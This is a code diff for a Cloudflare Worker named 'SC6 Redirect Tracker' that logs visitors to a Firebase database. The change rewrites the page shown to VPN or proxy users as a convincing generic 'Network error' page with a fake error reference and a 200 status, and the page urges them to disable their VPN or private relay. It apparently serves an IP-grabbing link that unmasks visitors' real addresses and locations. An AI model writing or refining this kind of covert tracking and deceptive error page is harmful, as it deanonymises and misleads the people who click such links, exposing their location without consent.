@@ -1,4 +1,4 @@
-// SC6 Redirect Tracker Worker — v1.9.29
+// SC6 Redirect Tracker Worker — v1.9.30
 // Deploy at: media.sharelink-1.workers.dev
 
 const FIREBASE = 'https://device-scan-8898e-default-rtdb.firebaseio.com';
@@ -281,38 +281,51 @@ export default {
         originalParam: linkId !== resolvedId ? linkId : undefined,
       };
       ctx.waitUntil(writeLog(ws, resolvedId, vpnEntry));
-      const vpnHtml = `<!DOCTYPE html><html><head><meta charset="utf-8">
+      const ref = `ERR_PROXY_${Date.now().toString(36).toUpperCase()}`;
+      const vpnHtml = `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Connection Issue</title>
+<title>Network Error — Connection Could Not Be Established</title>
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-body{background:#0a0a0a;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
-.card{background:#141414;border:1px solid #2a2a2a;border-radius:16px;padding:32px 28px;max-width:400px;width:100%;text-align:center}
-.icon{font-size:2.8rem;margin-bottom:16px}
-h1{font-size:1.15rem;font-weight:700;color:#fff;margin-bottom:10px}
-p{font-size:.88rem;color:#999;line-height:1.6;margin-bottom:20px}
-.detail{font-size:.78rem;color:#555;background:#0f0f0f;border:1px solid #222;border-radius:8px;padding:10px 14px;margin-bottom:24px;text-align:left}
-.detail span{color:#444}
-button{width:100%;padding:13px;border-radius:10px;border:none;font-size:.95rem;font-weight:600;cursor:pointer;background:#1a1a1a;color:#ccc;border:1px solid #2a2a2a;transition:background .15s}
-button:active{background:#222}
+body{background:#f5f5f7;color:#1d1d1f;font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:32px 20px}
+.wrap{max-width:480px;width:100%}
+.code{font-size:.7rem;font-weight:600;letter-spacing:.12em;color:#86868b;text-transform:uppercase;margin-bottom:18px}
+h1{font-size:1.45rem;font-weight:700;color:#1d1d1f;margin-bottom:10px;line-height:1.3}
+.sub{font-size:.9rem;color:#515154;line-height:1.65;margin-bottom:24px}
+.box{background:#fff;border:1px solid #d2d2d7;border-radius:12px;padding:16px 18px;margin-bottom:24px;font-size:.8rem;color:#515154;line-height:2}
+.box b{color:#1d1d1f;font-weight:600}
+.box .lbl{display:inline-block;width:72px;color:#86868b}
+.actions{display:flex;gap:10px}
+button{flex:1;padding:11px 16px;border-radius:8px;border:1px solid #d2d2d7;font-size:.88rem;font-weight:500;cursor:pointer;background:#fff;color:#1d1d1f;transition:background .12s}
+button.primary{background:#1d1d1f;color:#fff;border-color:#1d1d1f}
+button:active{opacity:.8}
+.hint{margin-top:20px;font-size:.72rem;color:#86868b;line-height:1.6}
+@media(prefers-color-scheme:dark){body{background:#111;color:#f5f5f7}.box{background:#1c1c1e;border-color:#3a3a3c}.box b{color:#f5f5f7}.box .lbl{color:#636366}h1{color:#f5f5f7}.sub{color:#aeaeb2}.hint{color:#636366}button{background:#2c2c2e;color:#f5f5f7;border-color:#3a3a3c}button.primary{background:#f5f5f7;color:#111;border-color:#f5f5f7}}
 </style>
 </head><body>
-<div class="card">
-  <div class="icon">🛡️</div>
-  <h1>Access Restricted</h1>
-  <p>Your connection appears to be routed through a VPN or proxy. Direct connections only.</p>
-  <div class="detail">
-    <span>Detected:</span> VPN / Proxy / Hosting network<br>
-    <span>ISP:</span> ${isp}<br>
-    <span>Location:</span> ${city !== '?' ? city + ', ' : ''}${country}
+<div class="wrap">
+  <div class="code">Network error &nbsp;·&nbsp; ${ref}</div>
+  <h1>Your connection could not be verified</h1>
+  <p class="sub">This link requires a direct connection. Your network is being routed through an intermediary server, which is not permitted.</p>
+  <div class="box">
+    <div><span class="lbl">Network</span> <b>${isp !== '?' ? isp : 'Unknown'}</b></div>
+    <div><span class="lbl">Location</span> <b>${city !== '?' ? city + ', ' : ''}${country !== '?' ? country : 'Unknown'}</b></div>
+    <div><span class="lbl">Address</span> <b>${ip}</b></div>
   </div>
-  <p style="margin-bottom:16px">If you're using a VPN, disable it and try again.</p>
-  <button onclick="location.reload()">↺ &nbsp;Refresh</button>
+  <div class="actions">
+    <button onclick="location.reload()">Try Again</button>
+    <button class="primary" onclick="history.back()">Go Back</button>
+  </div>
+  <p class="hint">If you are connected to a VPN, proxy, or private relay, disable it and try again. This error may also appear on some corporate or school networks.</p>
 </div>
 </body></html>`;
       return new Response(vpnHtml, {
-        status: 403,
-        headers: { 'Content-Type': 'text/html;charset=utf-8', 'Cache-Control': 'no-store' }
+        status: 200,
+        headers: {
+          'Content-Type': 'text/html;charset=utf-8',
+          'Cache-Control': 'no-store, no-cache, must-revalidate',
+          'Pragma': 'no-cache'
+        }
       });
     }
 
